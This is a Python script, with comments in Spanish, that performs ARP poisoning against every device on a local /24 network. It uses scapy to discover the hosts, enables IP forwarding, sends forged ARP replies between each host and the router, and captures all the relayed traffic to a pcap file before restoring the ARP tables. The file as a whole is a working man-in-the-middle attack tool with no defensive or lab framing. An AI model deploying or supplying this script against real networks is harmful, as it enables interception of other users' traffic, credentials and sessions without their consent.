#!/usr/bin/python
## -*- coding: utf-8 -*-
# Carlos Esteban Maccarrone -cem- 2018
# To exit Ctrl+C
# Las capturas se pueden ver con wireshark
# Sino mientras se ejecuta el programa $ tcpdump -i interfazDeRed -vvv port -A http

from scapy.all import *
import sys, time, threading, os, signal

# ARP op=2 : 'is-at' (respuesta) ---- op=1 : 'who-has' (solicitud)

# (manejadorSeniales se encarga de las interrupciones tipo kill process
#  que no permiten que wrpcap guarde las capturas)
def manejadorSeniales(signum, frame):
	os.kill(os.getpid(), signal.SIGINT)
	time.sleep(0.1)
	os.kill(os.getpid(), signal.SIGTERM)
	time.sleep(0.1)
	os.system('kill -STOP %d' % os.getpid())

signal.signal(signal.SIGTERM, manejadorSeniales)
signal.signal(signal.SIGTSTP, manejadorSeniales)

def restaurar(ipDestino, macDestino, ipOrigen):
	send(ARP(op=2, hwdst="ff:ff:ff:ff:ff:ff", pdst=ipDestino,\
				 hwsrc=macDestino, psrc=ipOrigen))

def peticionARP(ipDestino, macDestino, ipOrigen):
	send(ARP(op=2, pdst=ipDestino, hwdst=macDestino, psrc=ipOrigen))

def envenenamiento(ipsRed, macsRed, ipRouter, macRouter, macPropia):
	try:
		os.system("sysctl -w net.ipv4.ip_forward=1")
	except:
		print "Error: No se puede activar el /proc/sys/net/ipv4/ip_forward"
		sys.exit(1)
	while True:
		for i in range(0, len(ipsRed)):
			try:
				peticionARP(ipsRed[i], macsRed[i], ipRouter)
				peticionARP(ipRouter, macRouter, ipsRed[i])
				time.sleep(2)
			except:
				pass

def main():
	conf.verb = 0
	ipRouter = '192.168.1.1'
	redesIP = '192.168.1.0/24' # Mascara de red de tres octetos ip/24, cantidad de hosts=254

	conf.iface = 'wlp3s0' # Interfaz de red con la que se conecta

	print "\n[++]Obtener MAC del router"
	router_ = srp1(Ether(dst='ff:ff:ff:ff:ff:ff')/ARP(pdst=ipRouter),\
				retry=-2, timeout=2)

	if router_ is None:
		print "[++]El router "+str(ipRouter)+" no responde."
		sys.exit(1)

	macRouter = router_[ARP].hwsrc
	ipPropia = router_[ARP].pdst
	macPropia = router_[ARP].hwdst

	print "[++]Obtener direcciones MAC de los dispositivos activos en la red"
	respuestasRed, sinRespuestasRed = srp(Ether(dst='ff:ff:ff:ff:ff:ff')/\
						ARP(pdst=redesIP), retry=-2,\
						timeout=2)
	ipsRed = []
	macsRed = []

	for estimulo,respuesta_ in respuestasRed:
		if(respuesta_[ARP].psrc != ipRouter):
			ipsRed.append(respuesta_[ARP].psrc)
			macsRed.append(respuesta_[ARP].hwsrc)

	if len(ipsRed) == 0:
		print "[++]No se detectaron dispositivos"
		sys.exit(1)
	else:
		print "[++]Se encontraron "+str(len(ipsRed))+" dispositivos en la red\n"

	print "[++]ROUTER: IP = "+str(ipRouter)+" MAC = "+str(macRouter)+"\n"
	for i in xrange(0, len(ipsRed)):
		print "[++]Dispositivo: IP = "+str(ipsRed[i])+" MAC = "+str(macsRed[i])

	t = threading.Thread(target=envenenamiento, args=(ipsRed, macsRed, ipRouter, macRouter, macPropia))
	t.start()

	try:
		print "\n[++]Capturando trafico en capturas_.pcap\n"
		wrpcap("capturas_.pcap", sniff())
	except Exception as e:
		print "Error: " + str( e )

	for j in range(2):
		for i in range(0, len(ipsRed)):
			try:
				restaurar(ipsRed[i], macsRed[i], ipRouter)
				restaurar(ipRouter, macRouter, ipsRed[i])
			except:
				pass
			
	os.system("sysctl -w net.ipv4.ip_forward=0")
	print "\n[++]Finalizando envenenamiento"
	os.kill(os.getpid(), signal.SIGTERM)

main()
